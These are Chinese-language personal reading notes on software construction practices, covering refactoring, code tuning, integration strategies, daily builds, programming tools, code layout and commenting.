引入外部的成员函数：想要使用其他类的成员函数，但对方又不开放，怎么办？自己建一个； 引入扩展类：想要使用某个类的多个成员函数，有2种办法， 合成：建一个新类，然后将原类合成进去； 继承：如果使用了原类的所有接口，则使用继承，如果不是，使用合成； 对外隐藏变量：永远记得，要永远的隐藏成员变量，只能通过访问器进行访问； 如果某个成员变量不能修改，则删除它的 set() 函数，避免误导； 如果隐藏某个成员函数，类的接口呈现更好的抽象一致性，那么应该果断的隐藏它； 如果派生类没有什么特殊，则合并到基类中，删除派生类； 系统级重构 对于无法控制的数据，创建明确的索引源；例如前端框架，数据与组件的绑定； 单向类与双向类 工厂模式与构造函数； 抛出异常与处理错误； 安全的重构 方法 保存初始代码 小步伐 同一时间只做一项重构 将要做的事情一件一件罗列出来；重构的时候，先动纸和笔，而不是先动代码； 设置停车场：将重构过程中想到的待办事项，先写下来，而不是马上着手进行，先完成当前的事情再说，永远记得，一次只做一件事（不然会把事情搞得很复杂）； 多用检查点；目的：确保重构代码的执行符合预期； 利用编译器警告信息； 重新测试 增加测试用例 检查对代码的修改 根据风险高低，选择不同的重构方法； 避免：避免用重构替代重写，如果原始代码真的很烂，则应一脚踢开，重新设计和编码； 重构时间点：开发阶段的重构，是提升代码质量的最佳时机（原因：此时对代码的记忆最清晰） 在增加子程序时重构 在增加类时重构 在修复缺陷时重构 关注易于出错的模块； 关注高度复杂的模块； 在维护环境中，改善手中正在处理的代码； 定义清楚干净代码的标准，然后创建一个接口层，将旧代码与其进行隔离； 代码调整策略 性能概述 代码调整目的：通过代码层面的微调，提高效率，满足性能要求； 事实上，性能和代码执行速度之间的关系很松散，用户层面关心的性能，并不意味着仅仅在于代码执行速度，还包括操作的便捷性，简单性，有可能需要从优化交互设计入手； 提高性能的各项方法，处理的优先级按从高到低排列： 程序的需求：由于客户不了解开发成本，有时候会提出不切实际的理想化需求，此时，要给出两种方案的成本差距，会促进其理性的思考；例如所有操作1秒的响应时间和5秒的响应时间，成本差别巨大； 程序的设计：某些问题，在A框架下难以处理，但使用 B 框架，处理起来却易如反掌；如果性能或资源很重要，则一开始设计的时候，就应该将其明确提出来，做为整个系统和各个子系统的目标（原因：当目标明确时，程序员在编写代码时，就会依照目标去实现） 类和子程序：选择合适的数据类型和算法，会对性能产生很大的影响； 同操作系统的交互：有时候性能问题可能出在外部，例如 IO 代码编译：换一个更好的编译器，可能使用生成的代码执行起来非常高效； 硬件性能：增加硬件性能虽然粗暴，但最方便，也简单有效； 代码调整 帕累托法则：20%的代码消耗了80%的时间，甚至可能是5%的代码，消耗了95%的时间，找出它们，优化它们； 蜜糖和哥斯拉：粘乎乎的代码，哥斯拉般庞大 常见低效之源： 不必要的输入输出，例如访问磁盘、数据库、网络文件；应尽量优先在内存中处理； 内存分页：内存是有分页管理的，如果频繁的在内存分页间切换，会带来很多性能损耗；当然，如果内存很大，则这个差别不太明显； 系统调用：调用操作系统的子程序，例如磁盘、键盘、屏幕、打印机、第三方集成软件等； 解释型语言：（原因略，不解释） 错误：例如正式代码忘了去除调试信息、忘了释放内存、轮询不存在的记录、数据库的表设计失误、数据表没有索引等； 代码调整步骤 先编写设计良好的代码，让程序易于理解和修改； 如果存在性能问题 使用性能分析工具，找出热点 思考性能瓶颈是否源于糟糕的设计、数据类型或算法的缺陷，确认是否需要进行代码调整，如果不需要，返回第一步； 如果需要，保存一份初始代码； 对瓶颈部分进行改写； 再次测量改写结果 如果没有改进，返回初始状态，重新尝试其他改写方法； 重复步骤2 代码调整技术 逻辑判断 知道答案后立即停止计算； 按照出现概率调整判断顺序，越经常出现的场景，放在越前面； 用表查询替代复杂的逻辑表达式； 使用惰性求值：仅在需要的时候，才进行求值计算； 循环 将判断外提：如果循环过程中，某个判断结果并不会改变，可以将这个判断外提，减少每次循环的计算量； 合并：将对一组对象的多次循环操作，压缩成在单次循环中完成操作；（一开始先分开，因为分开更具易读性；当实在影响性能了，再合并） 展开：循环每次处理一个下标，可以考虑展示为每次处理两个或多个下标，这样可以变相减少循环的次数；代价是循环结束的判断变得复杂了； 减少循环内部的工作：如果某个计算可以在循环外完成，可以提出来，然后在循环过程中进行引用即可； 哨兵值：对于查找循环，可以设置一个不会和数据元素值重复的哨兵值，放在数据末尾，然后开始查找循环；如果循环结果等于哨兵值，则说没有找到（这样可以减少循环内部的判断操作，相当于将判断外提了，只在循环结束的时候，做一次结果判断）（如果判断非常复杂时，此技术适用；如果判断很简单，则提出退出循环也有好处）； 对于多层嵌套循环，最消耗性能的循环放在嵌套循环的最里层：100+1005 &gt; 5 + 5100，可以减少总的循环次数； 消减强度：如果循环内部有高强度的计算，可以考虑替换为低强度的计算，例如将乘法替换为加法； 数据 整数型代替浮点型：计算机处理整数型的速度要比浮点型快的多； 减少数组维度：多维数组的操作更加费时（貌似相当于嵌套循环了，可考虑先将数组压平，处理完以后，再恢复原来的形状） 减少数组引用：如果需要多次引用数组某个值，可以将其保存在某个变量中，再通过访问该变量，来减少对数组下标引用的访问次数； 索引：关键摘要信息通过索引存储（与数据本身一起，或者单独存储一份，对数据的访问，先通过索引实现，之后只一次性访问磁盘） 缓存：经常使用的重复数据，增加缓存机制；代价：会增加程序的复杂性和出错的概率； 表达式 利用代数恒等式，减少计算次数，例如 not a and not b ，替换为 not (a and b)， 原来的三次运算，减少为两次； 削弱计算强度：用加法替代乘法，用乘法替代幂乘，用三角恒等式替代三角函数，用移位操作替代乘2或除2，用long或int 代替 long long，用定点数或整型代替浮点型，用单精度代替双精度； 编译期初始化：如果有个子程序使用的某个参数是个常量，可以提前计算该常量并进行引用，减少每次调用子程序对该常量的重复计算； 小心系统函数：由于操作系统级别的函数的精度非常高，如果不需要这种精度，则减免调用系统函数； 使用正确的常量类型：常量的数据类型，与相关的被赋值的变量类型应一致，这样可以避免对二者进行计算时，需要做额外的类型转换计算；如果一开始类型定义正确，则可以减少类型转换工作； 提前计算结果：如果结果的值是一个比较小的范围，可以提前计算出结果，在需要的时候进行引用即可；这样可以减少每次引用的计算工作； 删除公共子表达式：如果某个表达式重复出现，此时应该引入一个命名良好的变量来替代它；一来避免重复计算，二来代码更加易于理解； 用低级语句重写部分代码： 例如 python 代码用 c 改写， java 编程用汇编改写等； 可以考虑自带翻译功能的编译器，让其将高级语言转换为汇编，然后将汇编提取出来保存使用； 程序规模对构建的影响 随着团队规模的扩大，交流的路径呈现乘数上升；控制交流规模的方法之一，即是通过文档； 项目规模的范围：50%的项目在10人以内；25%的项目在3人以内； 小项目的生产率，会比大项目高出 2-3 倍； 对于小项目，构建活动的时间，占整个开发时间的65%左右，对于大项目，则要少于50%；原因：随着项目规模的扩大，构建时间呈线性增长，但非构建活动的时间，即呈现非线性增长；导致构建活动的时间比例下降了；非构建活动包括：交流、计划、管理、需求分析、系统功能设计、接口设计和规格说明、架构、集成、消除缺陷、系统测试、文档编写； 程序-&gt;产品-&gt;系统，每一阶，都对应复杂度相应增加一个数量级，开发成本梯度约为 1 -&gt; 3 -&gt; 9；当开发人员用开发程序的经验，来评估产品或系统的开发成本时，会发生3倍甚至更多的误差； 管理构建 鼓励良好的编码实践 “如何鼓励良好的编码实践”是管理者要完成的关键问题之一，但这个制定标准的工作，不应由管理者来完成，而建议由一名受人尊敬的专家级架构师来完成（注意：必须确保架构师是受人尊敬的，而不是一名脱离编码实践，完全不了解开发人员在做什么的资深闲杂人士） 考虑事项：强制标准并不一定适用于每个团队，有些团队愿意接受，有些不愿意；如果不愿意，可以考虑采用其他更灵活的方式，例如指导原则、建议、最佳实践例子等； 鼓励良好实践的方法 给项目的每一部分分派两个人，方法有：结对，师徒、buddy-system（伙伴）；原因：可以保证一段代码至少有两个人认为它是可以工作的，并且是可读的； 代码复查：code review 或者 peer review，原因：确保每行代码至少有2-3个人读过；当开发人员知道自己的代码会被阅读时，会不自觉改变编写方法，让其更加易读，且不容易出错；（即使一开始没有制定标准，如果有代码复查，随着时间的推移，团队成员之间也会不自觉建立起一份关于什么是好代码的实践标准出来） 要求代码签名：在代码完成后，高级技术人员需要在代码上进行签名（原理：对事情负起责任的压力） 提供良好的代码示例供大家参考：达到目标的关键之一，就是先要明确目标，比起抽象文字，一份代码示例更加让人容易理解； 强制代码集体所有权：避免让开发人员认为自己编写的代码是属于自己的； 奖励好代码：如果自己无法判断什么是好代码，就千万不要奖励；可以考虑将奖励权交给开发团队自行决定； 简单的标准：管理者可以宣称代码的标准是所有代码他能够读懂 配置管理（变更控制） 变更控制：系统化的定义项目工件和处理变化，使项目一直保持其完整性； 需求变更和设计变更控制办法 遵循某种系统化的需求变更手续；好处：在执行变更之前，有机会思考一下，如何变更，才是对系统最有利的； 成组的处理变更：不要一有变更马上执行，要批量的处理；原因：这样才能从中挑出优先级最高的进行处理，而不是最简单的先处理； 评估变更成本：除了构建成本，还需要考虑需求、设计、编码、测试、文档等环节的工作成本，让变更人明白，变更是一项高成本的决策； 提防大量的变更请求：如果出现，意味着需求或设计出现了问题，应考虑需求和设计，是否应推倒出来；虽然这些会损失之前开发的代码，但如果需求或设计没有考虑清楚，未来会有更大的损失； 成立变更控制委员会：所有变更请求，需要先提交到委员会；委员会负责对需求变更进行筛选，去芜存精；虽然会有点官僚主义的味道，但在需求变更这个环节上，这种官僚主义是有必要的，且是有益的； 代码变更：无论任何时候，永远记得使用代码版本控制工具，不管是 svn 还是 git；它会为构建和调试带来帮助； 工具版本：将工具也纳入版本控制之中，确保代码的编译环境一致； 机器配置：制作统一的开发机器镜像，一来可以减少开发机器配置的时间，二来可以减少因机器配置不同产生的错误； 备份计划：定期为代码执行备份，同时测试备份可以用来恢复（注：可以考虑使用云盘，实时备份每次修改） 评估构建进度 评估的方法 建立目标：为什么评估？评估什么内容？只评估构建，还是包括其他环节？只评估工作量，还是包括节假日？评估准确度的要求？乐观与悲观评估的结果差距多大？ 为评估预留时间并制定计划：避免匆匆忙忙的评估；如果是评估一个大项目，则有必要将“评估”提升到一个小项目的级别来做，并且花时间制定一个评估计划； 清楚的说明软件需求：没有明确需求的评估，是无效的； 在底层细节进行评估：越接近底层，评估的准确率越高； 使用不同的评估方法，并比较结果（有哪些评估方法？评估软件，算法软件（如cocomo），外界评估专家，排练会议等； 定期重新评估：越接近项目结束的时间，接近的准确率越高；随着项目进行，定期重新评估，可以及时根据调整相关活动计划；注意：最好一开始就打好预防针，避免对早期评估的准确率抱太高的预期，这样可以为后期的重新评估减少阻力； 评估构建的工作量：随着项目规模变大，构建的工作量占整个项目工作量的比例越小；但这个比例在每个公司不尽相同，可以参考公司以前的数据进行估算； 进度的影响因素：最响进度的因素很多，其中项目规模是最大的影响因素，其他重要因素还包括产品复杂度、时间限制、存储限制、需求分析能力等； 评估与控制：评估很重要，但在评估之后，如何调度和控制资源完成进度更加重要； 进度滞后的处理 如果可行，增加时间（越接近项目的后期，时间的拖延会越严重，而不是减轻）； 将功能分为“必须有”、“有了更好”、“可选择”三类，砍掉“可选择”（其实最好一开始考虑使用精益开发的方法，第一版先开发最小可行产品） 扩充团队：如果项目中的任务可以分割，可以分得更细并安排给不同的人做，则增加人手有效；如果不行，则增加人手无效，甚至还会进一步拖延进度； 度量：度量是有必要的，也是可行的；虽然不能保证获得清晰的全景，但有还是比没有好；有一些度量工具，可以选择使用；一开始不要尝试收集所有数据，这样会被数据淹没；而应该先制定目标，提出要解决的问题，然后有针对性的进行度量，收集数据回答问题；基本上所有的项目环节都可以被度量，详细的项目可参考书中的表格； 把程度员当人看： 由于编程是一件高度抽象的活动，同时也需要充分沟通交流的活动，因此有必要结合 high-tech 和 high-touch ； 时间花费：通常情况下，程序员只有1&#x2F;3的时间花费在编码活动上面，另外还有1&#x2F;3花在了和编码没有任何有益关系的非技术活动上； 性能和质量差异：好的程序员和差的程序员，效率和质量可以差别到一个数量级，但这种差异却跟经验和工作时间没有关系；他们之间的天分和努力的差异，也十分巨大； 团队差异：好的程序员倾向于集中在一起，差的也是；80%的贡献来源于20%的贡献者；有必要为聘请10%的最好程序员多支持报酬，这种投资的回报非常可观，同时也不会给原团队拖后腿； 信仰问题：编码风格是一个信仰问题，很容易造成紧张的气氛；仅在会影响可读性、代码质量的问题上，提出风格建议，其他情况下，让程序员制定自己的标准即可；甚至可以在编码完成后，使用一些格式化工具，来统一注释风格、缩进风格等，因为这些都无关痛痒； 物理环境：安静，不容易被打扰、宽敞的环境，对于抽象的编程活动的效率影响是显著的，非常有必要在这方面进行投入（Joel Sponsky 的公司的办公室设计，或许值得借鉴）； 管理你的管理者 由于非技术出身的管理者随处可见，或者技术出身但已脱离技术10年以上的管理者也比比皆是；技术出色且与时俱进的管理则属凤毛麟角； 最佳方案是教育你的管理者，据说可以通过阅读《人性的弱点》一书，来对管理者进行管理，哈哈哈哈……，有道理哦，重点是学完还可以做在很多其他地方，“复用”非常方便； 集成 集成方式的重要性 产品不能在最后完成的时候才能运转，而应该是在整个构建过程中一直保证可以运转，这样才能够方便测试，也更早的暴露一些缺陷，进度更加可控，团队更有成就感，客户更加满意；因此，集成的顺序非常重要；个人觉得应该按照最小可用产品的原则，来安排开发的顺序和集成的顺序； 集成频率 阶段式：非常不好，因为每个单元在开发过程中会存在很多错误的假定、不清晰的接口文档、脆弱的封装等问题，而这些问题只有等到集成时才一下子大爆炸出来，增加了调试难度的数量级； 增量式：先构建某个最小的系统功能部件，之后不断往上加一点东西，然后测试，通过后，再加东西，一直反复直到完成（类似滚雪球）；好处：进度更透明、士气更高、客户更满意、测试更充分 增量集成策略 集成的顺序很重要，因集成顺序的安排，直接导致了构建顺序的先后；集成顺序策略有多种，每一种有其优缺点，重要是根据项目的特定需求进行选择； 自顶向下集成 优点： 由于在早期就对系统逻辑进行集成和测试，能够尽早的暴露一些高层概念设计方面的问题； 能够尽早的让系统可以工作起来； 缺点： 需要准备一卡车的 stub，而 stub 难免存在错误； 最后集成底层，涉及系统接口，如果存在性能问题，有可能反过来导致顶层的修改，导致增量的作用弱化； 总结： 一般很难实现纯粹的自顶向下，更常见的是单个功能模块的自顶向下，最后再集成各个功能模块； 自底向上集成 优点： 较早的发现底层系统接口可能存在的性能问题； 缺点 使用此方法前，需要先做完高层概念设计，但却到最后才能发现高层概念设计上的问题，但这个时候为时已晚，有可能导致前面很多底层的工作扔掉； 总结：纯粹的自底向下也很少见，更常见的是单个功能模块的自底向下； 三明治集成 先集成顶部的业务对象类，再集成底部的设备接口类和工具类，最后集成中间层的类； 优点：自顶向下和自底向上两种方法的折中，现实和实用的做法； 风险导向集成 顺序同三明治一样，但思考点在于先实现最有挑战，最困难的类，最后再处理轻松的；操作过程中，难免会出现某些类的难度一开始预估不足，这也是正常的； 功能导向集成 将系统拆解为一个一个独立的功能，然后逐个集成；一开始需要先搭出一个骨架，例如交互式菜单系统，先后再将功能逐个集成到骨架上面； 优点：脚手架最少、进度可见、面向对象设计更方便（因为功能一般可以映射为对象） 总结：纯粹的功能导向也很难，一般需要先集成某些底层代码，之后才能集成某个功能； T型集成 功能导向和风险导向的结合；先选择一个最有可能验证设计概念的功能模块，使用风险导向集成完成它，充分暴露潜在的问题，之后再使用功能导向的方法，实现骨架，最后逐一实现其他功能模块； 总结：集成类型很多，但更重要的是根据项目具体情况，混合使用以上各种策略，避免僵化； 每日构建（daily build）和冒烟测试 优点很多，包括可以便于诊断缺陷（上次可用本次不可用），及早发现问题避免问题潜伏积累，最后解决难度倍增；同时也能极大鼓舞团队士气，因为他们每天都可以看一些确实可用的进展； 相关事项 每日构建：确保是每天，而不是每几天或每周； 检查失败的构建：一旦构建失败，应将修复构建视为第一优先级的事项； 每天冒烟测试：没有冒烟测试的构建，纯粹是自欺欺人； 更新冒烟测试：没有更新的冒烟测试，同样是自欺欺人； 每日构建和冒烟测试自动化：无须多言； 如果项目很大，安排专人负责每日构建和冒烟测试更新（全职或兼职，视情况需要） 每次提交代码都有意义，但别等太久，最少每天一次（迫使开发人员将功能拆分为更小的模块） 提交代码前开发人员自己需要先进行冒烟测试； 惩罚导致构建失败的人：停止其工作，直至其修复构建；发糖果、捐基金等； 在早上发布构建：这样测试人员可以一上班便开始测试，而不是等到夜里；同时有问题也可以及时找到开发人员，夜里则不容易找到人； 即使有进度压力，也要坚持每日构建和冒烟测试：表面看上去它耗费时间，事实恰恰相反，它使得项目更快完成； 编程工具 设计工具 用一些图形化的符号来表达设计思路，例如：UML，架构方块图、继承体系图、实体关系图、类图等； 从本质上看，各种设计工具很像是一堆绘图软件包；相比于纸和笔，它们的好处在于进行修改时，各种图形符号的关系，可以快速自动修正，不须手工逐一更改； 源代码工具 编辑 集成开发环境IDE：花点钱买个最好的IDE是很好的投资； 针对多个文件的字符串查找和替换：例如有个地方发现了错误，查找更多文件中是否出现相同的错误；或者，对多个文件中的某个类或子程序改名； diff 工具：比较两个文件修改前后的变化；常见的工具如 git merge 工具：不同版本的代码进行合并，常见的工具如 git , svn； 代码格式化工具：按照统一设定的格式进行美化；例如：统一的缩进，高亮类名和子程序，一致的注释，调整参数列表等；尤其是在处理老代码时，可以快速的让老代码符合编码风格约定； 生成接口文档的工具：在编写源代码时，给部分文字打上标记（如 @tag），之后可以用工具将该部分文字提取出来生成文档（常见如 Javadoc）； 模板：一些需要经常从键盘输入的内容，提取其中的框架，做成模板；在需要使用的地方，通过键盘宏命令快速插入；这样一来可以节省很多输入的时间；二来也可以让团队拥有一致的编码风格； 交叉引用工具：用来列出所有变量和子程序，以及使用它们的位置（有一点像书籍附录的脚注索引）； 类的继承体系生成器：可以用来分析程序的结构，划分程序的模块，将系统分解为软件包或子系统； 分析代码质量 语法&#x2F;语义检查器：进行吹毛求疵的检查，例如各种 Lint 工具 尺度报告器：很高级的质量报告工具，可以检查子程序的复杂度，统计代码行，数据声明行，注释行，空行等；可以统计对程序的修改，找出哪个部分被频繁修改；可以跟踪缺陷，谁制造了缺陷，谁修复了缺陷等； 重构源代码 重构器：有些独立的，有些在IDE中集成；可以让重构变得很方便，而且不容易出错；例如提取某段代码生成子程序，重构器可以让这个动作变得很简便； 结构改组工具：一般可以运行一遍结构改组工具，看一下计算机的建议，为手工修改提供思路； 代码翻译器：可以将一种语言的代码翻译成另外一种语言（前提：源代码写得不错，如果源代码很烂，是翻译出来的代码一样烂，而且让人看不懂） 版本控制 源代码控制 依赖关系控制，类似 UNIX 的 make 工具； 文档的版本管理 将项目的工具关联在一起，工件包括需求、代码、测试用例等；这样当需求发生变更时，可以找到需要进行修改的代码和测试用例； 数据字典 用来描述项目中所有重要数据的数据库，即数据库模式 schema；包含每个数据项的名称和描述，也可能包括其使用的注意事项； 在大项目中，也用来跟踪成千上百的类定义，避免重复命名，命名冲突等； 可执行码工具 产生目标码 编译器：将源做对转换为可执行码（针对编译型语言） 链接器 标准链接器：连接多份目标文件，让它们协同工作；这些目标文件可能由多种不同的语言编写；通过使用链接器，减少了手工集中的工作； 覆盖链接器：当内存不足时，通过使用覆盖链接器，它可以动态的加载当前需要的文件到内存中，从而实现10个锅9个盖的可持续性运作； 构建工具（build） 通过构建工具来管理目标文件对源文件的依赖关系，确保目标文件的编译能够保持最新且一致的状态，同时也减少每次编译的工作量（只需编译有改动过的且有依赖关系的文件即可） 由于依赖检查比较费时，据说团队通过做好源文件的优化，然后每次构建不检查依赖关系，而是全部重新编译，最终的费时竟然更快； 开源库 以下类别有很多优秀的开源库，如果遇到此类场景，应该优先使用开源库，而不是自己重新造轮子，这些开源库覆盖的场景包括：容器类、信用卡交易服务、跨平台开发工具、数据压缩工具、数据结构与算法、数据库操作工具、数据文件操控工具、图像工具、许可证管理器、数学运算、网络与互联网通信工具、报表生成器与报表查询、安全与加密工具、电子表格与数据网格工具、文本与拼写工具、语音电话与传真工具； 代码生成器 很多IDE有集成一些代码生成器，它们主要是面向数据库的应用程序；虽然这类自动生成的代码基本不可读，但它的好处是可以用来快速生成一个粗糙的原型，然后用这个原型是做一些测试并验证想法；如果想法可行，再手工编写代码；如果一开始使用手工编写，可能原型制作要花费数周的时间，但使用代码生成器，则可能1天之内即可完成； 安装工具 安装程序生成工具；当编写好源代码并转换为目标文件后，可以使用这类安装工具来生成安装程序； 预处理器 场景：通过预处理器，可以在开发代码和生产代码做不同的配置；比如在开发代码中，某种子程序前面有个内存碎片整理的功能，但生产代码不需要，则可以通过使用宏预处理器，但不同的环境下，开启和关闭相应的功能； 有些语言有自带预处理器，有些没有，如果没有，可以考虑使用第三方独立的； 调试 编译器的警告信息、测试脚手架、diff工具、执行剖测器、追踪监测器、交互式调试器（软件版和硬件版） 测试 自动化测试框架（JUnit、NUnit、CppUnit）、自动化的测试生成器（这个是啥玩意，貌似很有用的样子）、测试用例的记录和回放工具、符号测试器、系统扰动器、覆盖率监视器、Diff工具、测试脚手架、缺陷注入工具、缺陷跟踪软件 代码调整 执行剖测器：用来做性能分析，可以发现程序运行的性能瓶颈，然后有针对性的进行调整； 汇编代码清单和反汇编：对于计算机来说，最终接收处理的是机器代码，它最近的上一层是汇编代码，编译器会将高级语言翻译成汇编代码，但是这份翻译结果很有可能出人意料；所以，当想要对代码进行性能调整时，去查看这份汇编代码，常常会有意想不到的收获，而且，离发现问题产生的本质最接近；同时，还可以反过来，用一种新的角度认识编译器及其所做的工作； 工具导向的环境 有些开发环境，例如 unix ，天生具备使用小工具的文化氛围，在这种氛围下，了解并擅长使用各式小工具，可以极大的提高生产效率；例如 grep, diff, sort, make, crypt, tar, line, ctags, sed, awk, vi 等； 如果开发环境原生不支持上述工具，例如 windows，则可以尝试去寻找类似的工具，一般都可以找到，关键是养成这种习惯； 打造你自己的编程工具 大多数程序员天生有打造工具提高自己生产效率的习惯，这是一种好事，因为如果有了一个好的工具，将可以在将来重复使用； 项目特有的工具：一般来说，中大型项目都会打造一些项目特有的工具，用来提高项目内部的工具效率； 脚本：如果日常工具中，老是出现一些重复工具，可以尝试将其写成脚本（也叫批处理命令），然后每次执行脚本即可，一来省时间，二来不出错； 工具幻境 在过往的历史中，总是有人跳出来说即将消除编程；但几十年过去了，我们确实提高了编程效率，但离消除却依然遥远；究其原因，其实本质在于理解复杂现实世界中的问题，以及告诉计算机如何去处理问题的这个工作，永远需要有人来做；只要计算机无法自动化完成这个工作，那么永远需要有人来做编程的工具； 布局与风格 基本原则 布局的极端情况：没有任何空白 格式化的基本原理：反应逻辑结构优于美观；将重点放在逻辑结构上面，展示逻辑结构的布局，都不会太难看；让好代码更美观，让差代码更丑，优于不管好坏代码都让其变美的技术； 人和计算机对程序的解读：人眼倾向于从代码的外观中理解逻辑，而计算机不管外观，只管语法规则；因此，好的布局是为人眼服务的，让外观和逻辑相符，而不是为计算机服务的； 在国际象棋中，棋子有意义的布置，高手的记忆能力远远强于新手，在代码中也是一样，有意义的代码布局，会让高手快速的记忆代码；如果代码杂乱无章，则高手和新手的记忆能力相差无几； 好的布局风格的特点：始终准确展示逻辑结构、易于阅读、易于修改； 布局技术 空白：空行、分组、缩进； 括号：应该用得比自己感觉需要的更多，例如表达式的求值，增加括号并不会带来任何损失，但给阅读的人极大的减少负担； 布局风格 纯块结构（块有明确的开始和结束）、模仿纯块结构（用符号模仿明确的开始和结束）、指定边界结构（用符号单起一行且缩进来指定开始和结束的边界，符号缩进位置与块内代码位置一致，块内代码不用两次缩进，原因：会增加复杂度）、行尾布局(这种结构遇到复杂逻辑时可读性大大降低，不推荐） 前三种结构在代码可读性上，并没有统计上的显著差别； 控制结构的布局 开始结束符号：记得缩进，同时避免代码缩进两次； 段落之间使用空行 复杂的条件表达式，将条件拆分成多行； case 语句避免使用行尾风格（原因：当 case 名很长的时候，行尾风格的对齐维护很麻烦） 单条语句的布局 语句长度：以前由于屏幕比较小，一般控制在80个字符内，现在由于大屏显示器的普及，为了提高可读性，适当增加一些字符也可以接受； 用空格使得语句显示清楚，包括应用在：逻辑表达式中、数组引用中、罗列子程序参数中； 格式化后续行 使后续行变得很明显：比如在行尾放置运算符，显得语句未结束，如果不当修改，也会出现报错；另一种方法是在续行头部放置运算符，由于左边比较容易被眼睛扫视，所以这种方法也不错； 紧密关联的元素放在一起：例如数组下标的引用； 子程序调用多个参数时，后续行按标准缩进 如果参数实在很多，可以考虑让每个参数单独占用一行并缩进，虽然这样会增加很多屏幕面积，但是修改和维护都比较方便，易读性也更好； 控制语句折行按标准缩进； 赋值语句避免使用等号对齐，原因：当变量名很长时，易读性会下降； 赋值语句折行按标准缩进 每行仅写一条语句 虽然有些理由支持减少语句行数，但从易读性、易维护性、易调试性来说，每行一条语句的优势更加多； 在 c++ 中，如果一行语句有副作用，应将其单独成一行；原因：这样才可以显而易见的看出执行的顺序，而不用费力去理解，而且也容易出错，出错也不容易发现； 数据声明的布局 每行只声明一个数据；原因：易修改、易读、易查找、易定位； 变量声明应该尽量接近使用的位置，减少跨度和生存期； 合理组织声明顺序：最好按类型进行分组，按字母排序就不要了； 在c++中，声明指针变量时，星号 * 应靠近变量名，这样如果一行有多个变量，不会出现仅第一个变量声明成功；但更好的做法是使用指针类型来声明变量；(EmployeeList *employees 改为 EmployeeListPointer employees) 注释的布局 注释的缩进应与相应的代码的缩进一致；原因：不然会破坏阅读的结构； 每段注释用一个空行隔开；原因：由于空行带来了分组的效果，易读性上升； 子程序的布局 用空行分隔子程序的各个部分，包括头部、数据、常量名声明等； 子程序参数使用标准缩进（每个参数单独起一行） 类的布局 类接口的布局：类成员的顺序如下 类的说明和使用方法注释 构造函数和析构函数 public 子程序 protected 子程序 private 子程序和数据成员 类实现的布局 如果编程语言对使用的文件数量没有什么限制的话，最好一个文件中，只放一个类 类实现文件的顺序如下 描述类所在文件内容的头部注释 类数据 public 子程序 protected 子程序 private 子程序 如果一个文件中有多个类，应该用多个空行，并用大写的字号将其分隔出来，就像书里面的新起一章一样； 文件和程序的布局 一个文件应该只有一个类 文件名应该与类名相关或一致； 文件中的子程序之间使用至少两个空行分隔开 将子程序按照字母排列（仅在一种情况下使用：编辑器不能快速查找子程序，不然没必要，太浪费时间，维护也很麻烦） 自说明代码 外部文档 外部结构文档通常比编码的层次更高，但比问题定义、需求和架构活动的层次低一些； 常见的外部文档类型 单元开发文件夹（UDF）：提供在其他地方没有说明的设计决策踪迹；单元一般指类，也可指包或组件（貌似这个一般写在类所有文件的头部？）（按照垠神的说法，类最适合用在对数据的抽象，我个人感觉这也符合SICP 第二章的要义；至于添加一些不属于类的方法在类里面，仅为了实现对数据的某种操作，这种思想是要不得的，只会增加复杂性；至此，我终于比较明白本书作者所说的类的子程序的抽象层次要足够高，并且要保持一致性；如果没有保持一次性，很有可能说明混入了一个本不应属于类的一种方法；此时坚持纯粹的完全面向对象的思维，就过头了；类的方法没有返回任何值，只是实现了对象内部数据的修改，这种副作用不知为何，一直让我感到不透明不放心）； 详细设计文档：低层次的文档，描述类层或子程序层的设计决定，曾考虑过的其他方案，以及采用当前方案的理由；存放的位置可能在UDF中，或单独文档中，或在代码中； 思考：如果通过 WIKI 来组织上面的相关文档，或许是一种不错的办法，因为在文档内部，可以加入相关文档的链接，让阅读更加的方便；（现在想想，或许最好的位置应该是离代码最近的位置，如果实在不行，至少可以放个链接） 编码风格作文档 代码层文档，最详细，而且也最有可能保持实时更新； 对于代码层文档，最重要的不是注释，而是代码风格本身，包括有意义的变量名和子程序名、简单的控制结构、具名常量、良好的结构布局等；注释不过是在前面的基础上，添加的小饰品；（好的风格，会让代码实现像自然语言一样的自说明，这是最好的境界；注释应该只是用来对思路的一种抽象，方便快速阅读，而不应该包括实现细节，细节的说明，将由代码的自说明来实现） 注释或不注释 注释可以在更高的抽象层次上显示代码的意图，因此在后续维护代码时可以提高效率，节省时间；但重复代码本身的注释则是一种浪费时间，另外也容易因为代码的重构而迅速过时，错误的注释比没有注释更加糟糕，因为它会误导人； 可行的办法：先用伪代码编程，最后再将伪代码转为注释； 高效注释之关键 注释的种类 重复代码：应避免； 解释代码：如果代码需要解释，说明代码写得过于复杂了，建议考虑重构，让其变简单； 代码标记：某些部分未完成，需要在发布前进行处理；建议团队统一该种注释的格式，以方便在发布正式版本前进行检查； 概述代码：将多行代码的意图用一行注释写出来； 意图说明：将一段代码的意图用一行注释写出来； 其他非代码信息：例如版本说明、版本号、保密要求等 对于完工的代码，只允许出现上面后三种注释； 高效注释： 如果注释写不出来，很可能是没有完全理解程序本身；而在写代码前，原本应花最多的时间理解程序上面；所以，写不出来很可能是一个警报的信号； 避免使用不容易维护的注释风格，例如各种冗余的为了美观的符号；美观是很好，但要让它维护起来不费吹灰之力才好； 建议用伪代码编程法减少花在注释上面的时间； 将注释集成到开发过程中，不要等项目完成时再来写注释，由于那个时候已经忘了很多代码的细节，需要重新花时间回忆，导致注释效率非常低下； 性能不是借口：如果注释会影响性能，只需要在发布正式版时，用格式化工具将注释统一删除掉即可，又快又简单，一举两得； 最佳注释量：IBM的研究是平均10行1条注释，但这并不是重点，重点是伪代码编程法，以及注释满足上术上述提到的要求； 注释技术 注释单行 不要写跟代码无关的注释，这样只会害死人； 行尾注释问题：避免对单行代码使用行尾注释，原因：不好维护，要花费很多时间调格式；不要阅读，眼睛不容易快速定位；经常只是重复代码，没有信息量； 使用行尾注释的两个场景：数据声明、标记块结束； 注释代码段 注释应表明代码的意图：应该在尽量高的层次上去表明意图，写出why（目标），而不是 how（过程）；可以想象如果这段代码转换为一个子程序，会如何给这个子程序命名（这个主意很棒，一针见血） 代码本身应该具备足够的说明性：可以通过有意义的变量名来达到这一点； 用注释为后面的内容做铺垫：这样做的好处，在于将来可以很容易定位想要查找的代码位置； 让每条注释都有用：删除没有用的注释，过多的注释并不好； 说明非常规做法：如果为了达到某种特定目的，例如性能提升，使用了一种非常规的做法，则可以用注释说明一下，并写出该种做法得到的好处； 不要使用缩略语； 